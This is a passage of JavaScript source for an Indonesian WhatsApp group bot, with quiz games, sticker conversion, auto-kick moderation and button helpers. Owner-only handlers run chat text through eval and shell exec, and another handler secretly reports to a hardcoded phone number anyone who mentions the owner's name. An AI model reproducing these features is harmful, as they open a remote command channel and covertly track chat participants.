const isRegistered = checkRegisteredUser(sender)

const sendImage = (teks, teks1) => {Fan.sendMessage(from, teks, image, {caption:teks1, quoted:mek, thumbnail:Buffer.alloc(0)})}
const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
Fan.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = `Hai kak  ${pushname} ${tampilUcapan} \n\nSebelum Mengakses Bot Verify Terlebih Dahulu Ya `
const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak jika button tidak terlihat ketik ${prefix}verify```'
const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `犬DAFTAR犬`,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Fan.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Fan.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Fan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Fan.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Fan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Documen
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await Fan.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
Fan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Fan.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Fan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
if (!mek.key.remoteJid.endsWith('@g.us') && offline){
			if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
			heheh = ms(Date.now() - waktuafk)
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "_𝐅𝐚𝐧 𝐗7_", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
				if (mek.message.extendedTextMessage != undefined){
					if (mek.message.extendedTextMessage.contextInfo != undefined){
						if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === Fan.user.jid){
                        if (isAfk(mek.key.remoteJid)) return
                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "_𝐅𝐚𝐧 𝐗7_", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
				}
						}
					}
				}
			}
		}
		// GAME 
             game.cekWaktuFam(Fan, family100)
          
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var http = randomNomor(100)
                    atm.addKoinUser(sender, http, _uang)
                    await reply(`*_🎮 Tebak Gambar  🎮_*\n\n** *Jawaban Benar🎉 *\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebakgambar.json", JSON.stringify(tebakgambar))
                }
            }
        if (game.isfam(from, family100)) {
            var anjuy = game.getjawaban100(from, family100)
            for (let i of anjuy){
                if (budy.toLowerCase().includes(i)){
                    var htgmp = Math.floor(Math.random() * 20) + 1
                    atm.addKoinUser(sender, htgmp, _uang)
                    await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
                    var anug = anjuy.indexOf(i)
                    anjuy.splice(anug, 1)
                }
            }
            if (anjuy.length < 1){
                Fan.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
                family100.splice(game.getfamposi(from, family100), 1)
            }
       }
            if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmu = randomNomor(100)
                    atm.addKoinUser(sender, htgmu, _uang)
                    await reply(`*_🎮 Tebak Anime 🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebakanime.json", JSON.stringify(tebakanime))
                }
            }
            if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklagu[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpl = randomNomor(100)
                    atm.addKoinUser(sender, htpl, _uang)
                    await reply(`*_🎮 Tebak Lagu 🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)
                    delete tebaklagu[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebaklagu.json", JSON.stringify(tebaklagu))
                }
            }
            if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaktebakan[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpu = randomNomor(100)
                    atm.addKoinUser(sender, htpu, _uang)
                    await reply(`*_🎮 Tebak Tebakan 🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)
                    delete tebaktebakan[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebaktebakan.json", JSON.stringify(tebaktebakan))                    
                }
            }
            if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = kuismath[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htcc = randomNomor(100)
                    atm.addKoinUser(sender, htcc, _uang)
                    await reply(`*_🎮 Kuis Matematika  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)
                    delete kuismath[sender.split('@')[0]]
                    fs.writeFileSync("./P2/kuismath.json", JSON.stringify(kuismath))
                }
            }
          if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = asahotak[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgm = randomNomor(100)
                    atm.addKoinUser(sender, htgm, _uang)
                    await reply(`*_🎮 Asah Otak  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
                    delete asahotak[sender.split('@')[0]]
                    fs.writeFileSync("./P2/asahotak.json", JSON.stringify(asahotak))
                }
            }
          if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmi = randomNomor(100)
                    atm.addKoinUser(sender, htgmi, _uang)
                    await reply(`*_🎮 Caklontong  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./P2/caklontong.json", JSON.stringify(caklontong))
                }
            }
          if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmuu = randomNomor(100)
                    atm.addKoinUser(sender, htgmuu, _uang)
                    await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebakjenaka.json", JSON.stringify(tebakjenaka))
                }
            }
            if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmii = randomNomor(100)
                    atm.addKoinUser(sender, htgmii, _uang)
                    await reply(`*_🎮 Tebak Lirik 🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)
                    delete tebaklirik[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebaklirik.json", JSON.stringify(tebaklirik))
                }
            }
            if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmcc = randomNomor(100)
                    atm.addKoinUser(sender, htgmcc, _uang)
                    await reply(`*_🎮 Tebak Kimia 🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
                    delete tebakimia[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebakimia.json", JSON.stringify(tebakimia))
                }
            }
          if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmk = randomNomor(100)
                    atm.addKoinUser(sender, htgmk, _uang)
                    await reply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                }
            }
          if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakbendera[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var html = randomNomor(100)
                    atm.addKoinUser(sender, html, _uang)
                    await reply(`*_🎮 Tebak Bendera  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)
                    delete tebakbendera[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebakbendera.json", JSON.stringify(tebakbendera))
                }
            }
          if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmp = randomNomor(100)
                    atm.addKoinUser(sender, htmp, _uang)
                    await reply(`*_🎮 Susun Kata  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)
                    delete susunkata[sender.split('@')[0]]
                    fs.writeFileSync("./P2/susunkata.json", JSON.stringify(susunkata))
                }
            }
          if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmu = randomNomor(100)
                    atm.addKoinUser(sender, htmu, _uang)
                    await reply(`*_🎮 Tebak Kata  🎮_*\n\n** *Jawaban Benar🎉*\n** *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)
                    delete tebakata[sender.split('@')[0]]
                    fs.writeFileSync("./P2/tebakata.json", JSON.stringify(tebakata))
                }
            }
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./P1/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					Fan.sendMessage(to, media, sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
        const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        Fan.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer FanX7ゑ v.3.0\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        Fan.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await Fan.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        Fan.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
		    Fan.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Hai ${pushname}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/628979185922?text=Assalamualaikum%20Kakak%20Irfan%20yang%20Ganteng`}}})
		}
		function monospace(string) {
return '```' + string + '```'
}
		const simir = (teks) => {
			Fan.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			Fan.sendMessage(hehe, teks, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		//>>>>>>>>STICKER<<<<<<<\\
		const sticOwner = (hehe) => {
			ano = fs.readFileSync('./P1/sticker/anime/owner.webp')
			Fan.sendMessage(hehe, ano, sticker, { quoted: mek})
		}				
		const sticNotAdmin = (hehe) => {
			ano = fs.readFileSync('./P1/sticker/anime/notadmin.webp')
			Fan.sendMessage(hehe, ano, sticker, { quoted: mek})
		}				
		const sticAdmin = (hehe) => {
			ano = fs.readFileSync('./P1/sticker/anime/admin.webp')
			Fan.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticWait = (hehe) => {
			ano = fs.readFileSync('./P1/sticker/anime/wait.webp')
			Fan.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticKick = (hehe) => {
			ano = fs.readFileSync('./P1/sticker/anime/kick.webp')
			Fan.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticOk = (hehe) => {
			ano = fs.readFileSync('./P1/sticker/anime/ok.webp')
			Fan.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? Fan.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Fan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
Fan.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
Fan.sendMessage(from, hasil, type, options).catch(e => {
Fan.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
const sendMediaURL = async(to, url, text="", mids=[]) =>{	    	
        if(mids.length > 0){		    
        text = normalizeMention(to, text, mids)	    	
        }		    
        const fn = Date.now() / 10000;		    
        const filename = fn.toString()	     	
        let mime = ""		    
        var download = function (uri, filename, callback) {		   
        request.head(uri, function (err, res, body) {			
        mime = res.headers['content-type']			
        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);		   
        });		   
        };		    
        download(url, filename, async function () {		    
        console.log('done');		    
        let media = fs.readFileSync(filename)		    
        let type = mime.split("/")[0]+"Message"		    
        if(mime === "image/gif"){			
        type = MessageType.video			
        mime = Mimetype.gif		    
        }		    
        if(mime.split("/")[0] === "audio"){			
        mime = Mimetype.mp4Audio		    
        }		    
        Fan.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})		    		    
        fs.unlinkSync(filename)		    
        });	       
        }
		   const sendFakeThumb = async function(from, url, title, desc){
				var anoim = {
					detectLinks: false
				}
				var qul = await Fan.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				Fan.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
			function Json(objectPromise) {
var objectString = JSON.stringify(objectPromise, null, 2)
var parse = util.format(objectString)
if (objectString == undefined) {
parse = util.format(objectPromise)
}
return reply(parse)
}
            function speedText(speed) {
                let bits = speed * 8;
                const units = ['', 'K', 'M', 'G', 'T'];
                const places = [0, 1, 2, 3];
                let unit = 0;
                while (bits >= 2000 && unit < 4) {
                    unit++;
                    bits/= 1000;
                }
                return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
            } 
            if(budy.includes('Cekprefix')){
cpref = ` *Prefix Saat ini: ( ${prefix} )*`
reply(cpref)
}
 if(budy.includes('cekprefix')){
cpref = ` *Prefix Saat ini: ( ${prefix} )*`
reply(cpref)
}
if(budy.includes('FanX7')){
Fan.sendMessage(from, "hayo ngomongin owner gua ya", text)
Fan.sendMessage("628979185922@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
Fan.sendMessage(from, "Mampus Udh Ku Laporin", text)
}
if(budy.includes('FanX7')){
Fan.sendMessage(from, "hayo ngomongin owner gua ya", text)
Fan.sendMessage("628979185922@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
Fan.sendMessage(from, "Mampus Udh Ku Laporin", text)
}
if(budy.includes('Fantod')){
Fan.sendMessage(from, "hayo ngomongin owner gua ya", text)
Fan.sendMessage("628979185922@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
Fan.sendMessage(from, "Mampus Udh Ku Laporin", text)
}
if(budy.includes('FanTod')){
Fan.sendMessage(from, "hayo ngomongin owner gua ya", text)
Fan.sendMessage("628979185922@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
Fan.sendMessage(from, "Mampus Udh Ku Laporin", text)
}
if(budy.includes('Assalamualaikum')){
cpref = `Hay Saya Xavhier Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('assalamualaikum')){
cpref = `Hay Saya Xavhier Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('Hai')){
cpref = `Hay Saya Xavhier Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('hai')){
cpref = `Hay Saya Xavhier Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('tendang')){
if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('reply targetnya!')
			kick = mek.message.extendedTextMessage.contextInfo.participant
		    Fan.groupRemove(from, [kick])
						reply('Sukses mengeluarkan peserta')
						}
           if (budy.startsWith('>')){
if (!isOwner && !mek.key.fromMe) return
console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
ras = budy.slice(1)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)
}
try{c
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('x')){
if (!mek.key.fromMe && !isOwner) return
try {
return Fan.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
			// AUTO
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./P3/sticker/${anji}.webp`)
					Fan.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./P3/vn/${anju}.mp3`)
					Fan.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./P3/image/${anjh}.jpg`)
					Fan.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
				  }
    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 2500) {
        if (isGroupAdmins) return reply("admin bebas");
        	var kic = `${sender.split("@")[0]}@s.whatsapp.net`
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        Fan.groupRemove(from, [kic]).catch((e) => { reply(`WKWKWK MAMPUS DI KICK🗿`) })
            }
        }
   
           if (budy.includes("https://chat.whatsapp.com/","http://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				Fan.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Auto kick!')
			    Fan.groupRemove(from, [kic]).catch((e) => { reply(`JURUS TENDANG BOCIL EP EP🗿`) })
			}
			}
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./P2/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }
        
 
			if (!m.key.fromMe && bad.includes(messagesD)) {
			ano = fs.readFileSync('./P1/sticker/anime/toxic.webp')
			Fan.sendMessage(from, ano, sticker, { quoted: mek})
				}
		
if (!settings.autoread) {
Fan.chatRead(from)
}
if (!settings.autocomposing) {
Fan.updatePresence(from, Presence.composing)
}
if (!settings.autorecording) {
Fan.updatePresence(from, Presence.recording)
}


   const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcreply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
       
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (isCmd && antiSpam.isFiltered(from) && !isGroup) { console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return reply('😒Sabar Bang 5 Detik/Command')}  
if (isCmd && antiSpam.isFiltered(from) && isGroup) { console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return reply('😒Sabar Bang 5 Detik/Command')}
if (isCmd && !isOwner) antiSpam.addFilter(from)
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
	    if (isCmd && !isGroup) {console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
	    if (!command) {console.log(color('|MSG|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
		
		//runtime berjalan
           runi = process.uptime() 
           Fan.setStatus(`RUNTIME🗿${waktu(runtime)}`).catch((_)=>_);

           settingstatus = new Date() * 1;
           
        switch (isStc) {
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('reply stickernya bgsd!')
        su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
        reply(su)
				}
        switch (command) {


        	case 'hadiah':
        	case 'gift':
